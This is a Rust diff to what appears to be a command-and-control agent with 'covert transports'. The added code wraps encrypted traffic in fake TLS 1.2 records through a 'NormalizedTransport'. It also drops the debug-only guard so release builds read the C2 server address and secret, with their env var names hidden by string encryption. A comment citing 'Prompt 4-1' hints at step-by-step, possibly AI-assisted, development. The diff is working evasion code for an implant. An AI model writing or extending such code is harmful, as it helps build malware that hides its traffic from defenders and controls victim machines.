@@ -26,6 +26,7 @@
 //! use certificate pinning.
 
 use anyhow::{anyhow, Result};
+use common::normalized_transport::{NormalizedTransport, Role, TrafficProfile};
 use common::tls_transport::{PinnedCertVerifier, TlsTransport};
 // CryptoSession is used by the TLS fallback path (when forward-secrecy is off)
 // and by the DoH/HTTP covert transports.  When forward-secrecy is on AND no
@@ -55,7 +56,6 @@ const MAX_BACKOFF_SECS: u64 = 64;
 
 /// Resolve the server address: runtime env var beats compile-time constant.
 pub fn resolve_addr() -> Option<String> {
-    #[cfg(debug_assertions)]
     {
         let raw = string_crypt::enc_str!("ORCHESTRA_C");
         let key = std::str::from_utf8(&raw)
@@ -70,7 +70,6 @@ pub fn resolve_addr() -> Option<String> {
 
 /// Resolve the pre-shared secret: runtime env var beats compile-time constant.
 pub fn resolve_secret() -> Option<String> {
-    #[cfg(debug_assertions)]
     {
         let raw = string_crypt::enc_str!("ORCHESTRA_SECRET");
         let key = std::str::from_utf8(&raw)
@@ -220,7 +219,22 @@ pub async fn build_outbound_transport(
     #[cfg(not(feature = "forward-secrecy"))]
     let session = CryptoSession::from_shared_secret(secret.as_bytes());
 
-    Ok(Box::new(TlsTransport::new(tls_stream, session)))
+    // Wire traffic normalization profile from config (M-39 / Prompt 4-1).
+    // When `traffic_profile = "tls"` the raw ciphertext is additionally wrapped
+    // in fake TLS 1.2 application-data records by NormalizedTransport; the
+    // real outer TLS already provides confidentiality and authentication.
+    let traffic_profile = crate::config::load_config()
+        .map(|c| c.traffic_profile)
+        .unwrap_or_default();
+
+    match traffic_profile {
+        TrafficProfile::Tls => {
+            info!("outbound-c: applying NormalizedTransport (traffic_profile=tls)");
+            let nt = NormalizedTransport::connect(tls_stream, session, Role::Client).await?;
+            Ok(Box::new(nt))
+        }
+        TrafficProfile::Raw => Ok(Box::new(TlsTransport::new(tls_stream, session))),
+    }
 }
 
 /// Send the initial heartbeat and start the agent command loop for any transport.
